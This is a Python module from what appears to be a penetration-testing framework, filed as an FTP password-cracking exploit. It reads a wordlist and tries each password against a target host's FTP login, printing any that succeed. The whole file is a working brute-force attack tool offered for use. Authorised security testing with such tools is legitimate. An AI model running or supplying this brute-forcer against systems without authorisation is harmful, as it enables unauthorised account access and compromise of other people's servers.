import ftplib
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "ftp",
        "title"       : "Guess the protocol password",
        "module"      : "exploits/crack/password/protocol/ftp",
        "description" : "Guess the protocol password"
}

var.rports = ['21']

options ={
  "RHOSTS"   : [str(var.rhosts[0]),'Host target'],
  "RPORTS"   : [str(var.rports[0]),'port target'],
  "USERNAME" : [str(var.username[0]),'Username target'],
  "LISTPASS" : [str(var.listpass[0]),'Wordlist']
}

def connect(host,port, user, password):
        try:
                ftp = ftplib.FTP(host, port)
                ftp.login(user, password)
                print(green+"[+]"+default+"Login successfuly with password: "+str(password)+cl.end+'\n')
                ftp.quit()
        except Exception:
                return False

def running():
        try:
                host = var.rhosts[0]
                port = var.rports[0]
                user = var.username[0]
                password = var.listpass[0]
                read = open(password, 'r')
                for word in read:
                        word = word.strip('\n')
                        print(blue+"[*]"+default+"Testing: "+str(word))
                        connect(host,port, user, word)
        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))
